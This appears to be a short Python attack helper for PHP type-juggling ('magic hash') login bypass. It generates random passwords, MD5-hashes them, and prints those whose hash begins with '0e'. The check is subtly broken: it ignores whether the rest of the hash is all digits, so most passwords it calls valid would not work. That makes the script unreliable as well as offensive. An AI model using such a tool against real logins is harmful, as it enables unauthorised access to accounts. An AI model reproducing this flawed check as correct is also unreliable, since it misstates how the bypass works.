# Description: Python script to make passwords that abuse php type confusion
# Author: Ally Petitt

from string import digits, ascii_letters 
from hashlib import md5
import random

def generate_password(length=10) -> tuple[str, str]:
    chars = digits + ascii_letters
    random_pass = ''.join(random.choice(chars) for _ in range(length))

    pw_hash = md5(random_pass.encode('utf-8'))

    return (random_pass, pw_hash.hexdigest())


i = 0
# find 10 randome passwords that result in the hash we want
while i < 10:
    (passw, pw_hash) = generate_password()
    if pw_hash[0:2] == "0e":
        print(f"Valid Password found: {passw} -> {pw_hash}")
        i += 1
